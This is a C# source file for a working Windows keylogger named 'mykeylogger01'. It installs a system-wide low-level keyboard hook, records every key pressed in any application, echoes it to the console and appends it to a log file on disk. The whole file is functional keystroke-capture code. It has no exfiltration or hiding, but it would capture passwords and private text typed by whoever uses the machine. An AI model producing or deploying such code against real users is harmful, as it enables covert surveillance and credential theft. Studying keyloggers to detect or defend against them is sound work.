using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using static System.Net.Mime.MediaTypeNames;

namespace mykeylogger01
{
    class Program
    {
        // Constants for Windows hooks and messages
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;

        // Handle to the hook and the method to call when the hook is triggered
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        static void Main(string[] args)
        {
            // Set up the keyboard hook and start listening for events
            hook = SetHook(llkProcedure);
            System.Windows.Forms.Application.Run();

            // Unhook when the application is terminated
            UnhookWindowsHookEx(hook);
        }

        // Delegate for the low-level keyboard procedure
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // Callback function for the keyboard hook
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Check if the hook code is valid and the event is a key down event
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                // Read the virtual key code from the message parameter
                int vkCode = Marshal.ReadInt32(lParam);

                // Depending on the key pressed, perform specific actions
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    // Log a period when the '.' key is pressed
                    Console.Out.Write(".");
                    StreamWriter output = new StreamWriter(@"C:\Users\los\source\repos\mykeylogger01\mylog.txt", true);
                    output.Write(".");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    // Log a comma when the ',' key is pressed
                    Console.Out.Write(",");
                    StreamWriter output = new StreamWriter(@"C:\Users\los\source\repos\mykeylogger01\mylog.txt", true);
                    output.Write(",");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    // Log a space when the spacebar is pressed
                    Console.Out.Write(" ");
                    StreamWriter output = new StreamWriter(@"C:\Users\los\source\repos\mykeylogger01\mylog.txt", true);
                    output.Write(" ");
                    output.Close();
                }
                else
                {
                    // Log the pressed key
                    Console.Out.Write((Keys)vkCode);
                    StreamWriter output = new StreamWriter(@"C:\Users\los\source\repos\mykeylogger01\mylog.txt", true);
                    output.Write((Keys)vkCode);
                    output.Close();
                }
            }
            // Pass the hook information to the next hook procedure in the hook chain
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        // Set up the keyboard hook
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            // Get the handle to the current process and its main module
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);

            // Set the keyboard hook and return the handle
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        // Import necessary functions from user32.dll and kernel32.dll
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}
